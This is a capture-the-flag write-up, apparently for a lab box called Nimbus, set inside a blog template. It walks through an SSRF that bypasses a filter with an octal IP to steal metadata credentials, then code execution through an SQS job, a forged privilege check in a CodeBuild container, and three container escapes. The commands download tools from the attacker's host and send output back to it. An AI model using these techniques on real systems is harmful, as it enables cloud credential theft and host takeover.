<%
	meta("../../meta.json")
	meta()
	const path = require('path');
	require(path.resolve(path.dirname(inputPath), "../../_partials/hljs-terminal.js"));
	url = url + "/posts/" + path.basename(path.dirname(outputPath)) + "/";
	const _allPosts = metas("../../posts").filter(p => p.meta.published);
	_allPosts.sort((a, b) => b.meta.date.localeCompare(a.meta.date));
	const _mySlug = path.basename(path.dirname(outputPath));
	const _myIdx = _allPosts.findIndex(p => p.directory === _mySlug);
	const prevPost = _myIdx < _allPosts.length - 1 ? _allPosts[_myIdx + 1] : null;
	const nextPost = _myIdx > 0 ? _allPosts[_myIdx - 1] : null;
%>
<%= render("../../_partials/post-header.html", { title, image, url, description, caption, date, tags, reading_time }) %>

Nimbus is a Hard Linux box where the interesting part is a fake AWS. The web app has a job preview feature that fetches a URL server-side, and an octal-encoded IP gets that SSRF past the blocklist to the cloud metadata service. The stolen role can only write to one SQS queue, but a worker on the other end of that queue runs a `script` field from the job YAML with `exec()`, which gives code execution inside a privileged CodeBuild container. The container's entrypoint is supposed to drop root, and a bash function-export trick stops it. From root in a privileged container, the host falls three different ways, and the simplest is mounting the host disk.

## Recon

Two vhosts are needed, because the box uses name-based virtual hosting and the bare IP shows nothing useful:

```terminal
❯ echo "10.129.245.218 nimbus.htb aws.nimbus.htb" | sudo tee -a /etc/hosts
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.245.218 -oG allPorts
❯ nmap -sCV -p 22,80 10.129.245.218 -oN targeted
```

Only SSH and HTTP are open. `nimbus.htb` is a job preview app: a form that takes a URL and shows what the server fetched. `aws.nimbus.htb` returns a 403 with an XML body shaped exactly like an AWS STS `InvalidClientTokenId` error. That is not a dead end. It is the auth gate of a local AWS-compatible emulator, so there is a fake AWS behind that name. Browsing it directly won't get anywhere, and the way in is through the SSRF on `nimbus.htb`.

## SSRF to the metadata service

The preview feature fetches a URL and prints the response, a classic SSRF shape. Two checks stand in the way: it blocks internal addresses typed directly (`127.0.0.1`, `169.254.169.254`), and it only previews URLs ending in `.yaml` or `.yml`. The request has to be a POST, since a GET with query parameters just returns a generic error page.

The blocklist only recognises the decimal dotted form of the IP. `169.254.169.254` written in octal, one octet at a time, is `0251.0376.0251.0376`, and the network stack resolves it to the same address. Appending `?a=test.yaml` satisfies the extension check without changing where the request goes:

```terminal
❯ curl -s -X POST "http://nimbus.htb/jobs/preview" \
    --data-urlencode "url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/?a=test.yaml"
nimbus-web-role
```

That is the IAM role attached to the instance. This is CWE-918, and the path is the standard IMDS API, identical on real AWS and on this emulator. Asking for the role by name returns temporary credentials:

```terminal
❯ curl -s -X POST "http://nimbus.htb/jobs/preview" \
    --data-urlencode "url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml"
```

The response holds an `AccessKeyId`, `SecretAccessKey`, `Token` and `Expiration`. I exported them for the AWS CLI:

```terminal
❯ export AWS_ACCESS_KEY_ID='...'
❯ export AWS_SECRET_ACCESS_KEY='...'
❯ export AWS_SESSION_TOKEN='...'
❯ export AWS_DEFAULT_REGION=us-east-1
```

The emulator hands out the same static credentials every time, with a fresh expiry. If the token expires, repeat the SSRF to get a new one.

## What the role can do

`sts get-caller-identity` confirms the identity is `nimbus-web-role`. Everything outside SQS came back `AccessDenied`:

```terminal
❯ aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
❯ aws --endpoint-url http://aws.nimbus.htb sqs list-queues
http://floci:4566/847219365028/nimbus-jobs
```

The queue URL uses the internal hostname `floci`. From outside, the same queue is at `http://aws.nimbus.htb/847219365028/nimbus-jobs`. To avoid guessing services one at a time, I ran `enumerate-iam` against the stolen credentials, pointed at the emulator:

```terminal
❯ git clone https://github.com/andresriancho/enumerate-iam.git && cd enumerate-iam
❯ pip install -r requirements.txt --break-system-packages
❯ AWS_ENDPOINT_URL=http://aws.nimbus.htb AWS_DEFAULT_REGION=us-east-1 \
  PYTHONPATH=. python3 enumerate-iam.py \
    --access-key "$AWS_ACCESS_KEY_ID" --secret-key "$AWS_SECRET_ACCESS_KEY" --session-token "$AWS_SESSION_TOKEN"
```

It pruned every denied call and left only the SQS ones, so SQS is the one open door. The front end says jobs are "parsed with safe_load, no code execution at submission time". That is true for the submission path, but it says nothing about what the worker does with the job later.

## Code execution through the queue

The worker reads a `script` field from the job body. To confirm delivery before sending anything heavy, I sent a ping and watched for it:

```terminal
❯ sudo tcpdump -i tun0 icmp -n
❯ aws --endpoint-url http://aws.nimbus.htb sqs send-message \
    --queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs \
    --message-body '{"command": "import os; os.system(\"ping -c 3 10.10.16.135\")"}'
```

The root cause is CWE-502. The worker `exec()`s the decoded `script` as live Python instead of treating it as inert config. `safe_load` at submission doesn't protect a different piece of code that consumes the same data later. The delivery format wraps a base64 Python file in a fixed YAML envelope, and only the Python changes between jobs:

<div class="code-file">job.yml</div>

```yaml
name: my-job
script: "import base64;exec(base64.b64decode('<BASE64_OF_YOUR_PYTHON_FILE>').decode())"
```

```terminal
❯ B64=$(base64 -w0 your_payload.py)
❯ cat > job.yml <<JOBEOF
name: my-job
script: "import base64;exec(base64.b64decode('$B64').decode())"
JOBEOF
❯ aws --endpoint-url http://aws.nimbus.htb sqs send-message \
    --queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs \
    --message-body "$(cat job.yml)"
```

## Root inside the CodeBuild container

The payload runs on the worker's side, which can talk to the emulated CodeBuild service at `http://floci:4566`. It creates a project with `privilegedMode: True` and starts a build. That build is a real privileged Docker container started in response to my job. Its entrypoint drops privileges before running the buildspec, unless it is fooled.

The entrypoint calls `id` to decide whether it is already running as a non-root user. Bash can export shell functions through environment variables named `BASH_FUNC_<name>%%`, the same mechanism Shellshock abused, though this is not that CVE. Exporting `BASH_FUNC_id%%` replaces every call to `id` in the shell, so the entrypoint's check sees a forged `uid=1000` and skips the real drop. The buildspec then runs as real root.

The name has to match what the entrypoint actually calls. `BASH_FUNC_gosu%%` does nothing, because the entrypoint calls `id` first to decide whether to run `gosu` at all. The exploit logic also can't live in the function body, which is only ever a stand-in for that one `id` call. It goes in the buildspec commands.

<div class="code-file">your_payload.py (excerpt)</div>

```python
import boto3

cb = boto3.client('codebuild', region_name='us-east-1', endpoint_url='http://floci:4566',
                  aws_access_key_id='test', aws_secret_access_key='test')

cb.create_project(
    name='my-project',
    source={'type': 'NO_SOURCE'},
    artifacts={'type': 'NO_ARTIFACTS'},
    environment={'type': 'LINUX_CONTAINER', 'computeType': 'BUILD_GENERAL1_SMALL',
                 'image': 'floci/floci:latest', 'privilegedMode': True},
    serviceRole='arn:aws:iam::000000000000:role/codebuild-role',
)

cb.start_build(
    projectName='my-project',
    environmentVariablesOverride=[
        {'name': 'BASH_FUNC_id%%', 'value': '() { echo uid=1000; }', 'type': 'PLAINTEXT'}
    ],
    buildspecOverride=buildspec,
)
```

A buildspec step running `id` prints the forged `uid=1000`, while `/proc/self/status` shows `Uid: 0 0 0 0` and `CapEff: 000001ffffffffff`, the full root capability set. The drop never happened.

## Getting output back

Nothing hands over an interactive shell, so each buildspec step POSTs its output to a listener on my machine. A bare `nc -lvnp` doesn't work here. It accepts one connection and exits, and each step opens its own `curl` connection, so only the first POST showed up and it looked like the exploit had failed. A small HTTP server keeps accepting:

<div class="code-file">listener.py</div>

```python
import http.server

class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        with open('hits.log', 'a') as f:
            f.write(f"[{self.path}] {body}\n")
        self.send_response(200)
        self.end_headers()

http.server.HTTPServer(("0.0.0.0", 9071), H).serve_forever()
```

I also hit a timeout trap. A listener started with `timeout 150 python3 listener.py &` expired between jobs and the callbacks went nowhere. Starting it with `nohup ... & disown` and a longer timeout fixed that.

## Container to host

Root in the container is not root on the host yet. A privileged container removes enough restrictions that several classic escapes work. I tested three, and all three worked.

### Method A: core_pattern

`/proc/sys/kernel/core_pattern` tells the kernel what to do with a crashed process. If the value starts with `|`, the kernel runs that path as root on the host for every crash. It is a host-wide setting, so writing it from a privileged container reconfigures the real kernel.

The helper runs through the host's view of the filesystem, so a container path like `/exploit_root.sh` is invisible to it. The container's overlay `upperdir` from `/proc/self/mountinfo` is the host-visible location of the same files:

```terminal
❯ UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
❯ printf '#!/bin/sh\ncat /root/root.txt > %s/rootflag.txt\nchmod 777 %s/rootflag.txt\n' "$UDIR" "$UDIR" > /exploit_root.sh
❯ chmod +x /exploit_root.sh
❯ echo "|${UDIR}/exploit_root.sh" > /proc/sys/kernel/core_pattern
❯ ulimit -c unlimited
❯ bash -c 'kill -11 $$'
❯ sleep 5
❯ cat /rootflag.txt
```

`kill -11 $$` crashes a subshell with SIGSEGV, which fires the helper. The helper runs under `/bin/sh`, not bash, so `/dev/tcp` redirection silently does nothing there. Relay output with `curl` or plain file writes. This returned `root.txt`.

### Method B: modprobe and binfmt_misc

`/proc/sys/kernel/modprobe` is the binary the kernel runs to load a module when it hits an unknown file type. Point it at a script, register a bogus binary format, and execute a file that matches its magic bytes:

```terminal
❯ echo "${UDIR}/modroot.sh" > /proc/sys/kernel/modprobe
❯ printf '\xff\xff\xff\xff' > /dummy
❯ chmod +x /dummy
❯ /dummy
```

The same `upperdir` fix applies, because the helper resolves paths against the host. A script at a plain container path like `/tmp/modroot.sh` fails silently with no flag and no error. On a fresh container `/proc/sys/fs/binfmt_misc` can exist but be empty, which looks broken and isn't, since the modprobe write is what gets the module loaded.

### Method C: mount the host disk

This is the most direct. A privileged container sees the host's block devices, and `/dev/sda4` is the same disk that is already mounted into the container. Mounting it at a fresh mountpoint gives an unfiltered view of the host root. It only needs `CAP_SYS_ADMIN`, which the container has, plus a `mount` binary.

The build image has almost no tools: no `mount`, `lsblk`, `fdisk`, `busybox`, `python3` or compiler. A static busybox from my machine provides a `mount` applet:

```terminal
❯ sudo apt-get install -y busybox-static
❯ cp /bin/busybox ./www/busybox
❯ python3 -m http.server 8000 --directory ./www
```

Busybox picks its applet from `argv[0]`. Saved as `/tmp/bb`, it fails with `applet not found`, so the file has to be named `/tmp/busybox`. The buildspec steps are:

```terminal
❯ curl -s -o /tmp/busybox http://10.10.16.135:8000/busybox
❯ chmod +x /tmp/busybox
❯ mkdir -p /mnt2
❯ /tmp/busybox mount -t ext4 /dev/sda4 /mnt2
❯ cat /mnt2/root/root.txt
❯ ls /mnt2/home
❯ cat /mnt2/home/marcus/user.txt
```

`ls -la /mnt2` showed a real host root, with `root` at mode `drwx------`. The home directory belongs to `marcus`, and this method returned both `user.txt` and `root.txt` in one run. `root.txt` matched the value from Method A.

Methods A and B are real code-execution primitives, so they can point at a reverse-shell script instead. Method C is a file-write primitive, and the equivalent there is planting an SSH key in the host's `/root/.ssh/authorized_keys`.

## Takeaways

- The SSRF filter checked the textual form of the IP, not the resolved address, so octal notation walked past it. The fix is to resolve the host and check the result against a deny list, and to block the metadata service itself (IMDSv2 with hop limit 1).
- Parsing with `safe_load` at submission protected nothing, because the worker later `exec()`ed a field from the same data.
- A privilege drop that depends on running `id` through an environment the attacker can influence isn't a security boundary. Calling `/usr/bin/id` by absolute path, or dropping with `setuid` directly, wouldn't have been controllable.
- `privilegedMode: True` makes the container root effectively host root, so any one of the three escapes finishes the box.

<%= render("../../_partials/post-footer.html", { url, title, tags, prevPost, nextPost }) %>
